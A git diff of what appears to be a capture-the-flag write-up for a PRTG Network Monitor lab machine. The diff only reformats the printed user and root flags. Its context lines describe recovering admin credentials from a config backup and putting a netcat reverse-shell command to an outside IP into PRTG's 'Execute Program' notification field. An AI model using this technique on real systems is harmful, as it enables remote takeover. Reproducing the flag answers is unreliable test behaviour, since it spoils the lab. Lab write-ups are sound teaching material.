@@ -12,9 +12,7 @@ The default credentitials `prtgadmin:prtgadmin` do not work and I do not find an
 
 From there I can access every resources on the machine as a user. First I get the user flag in `/Users/Public`:
 
-```
-dd58ce67b49e15105e88096c8d9255a5
-```
+`dd58ce67b49e15105e88096c8d9255a5`
 
 Then I search for PRTG config files which could contain some credentitials. The default location for configuration files is `/programdata/Paessler/PRTG Network Monitor`. I transfer all of them on host and finally find something interesting in `PRTG Configuration.old.bak`: `prtgadmin:PrTg@dmin2018`.
 
@@ -42,6 +40,4 @@ Finally I check the `Execute Program` box and I fill it with `nc 10.10.14.34 444
 
 A shell pops up on host as system administrator when I send a notification test with those settings. I can now get my root flag:
 
-```
-3018977fb944bf1878f75b879fba67cc
-```
+`3018977fb944bf1878f75b879fba67cc`
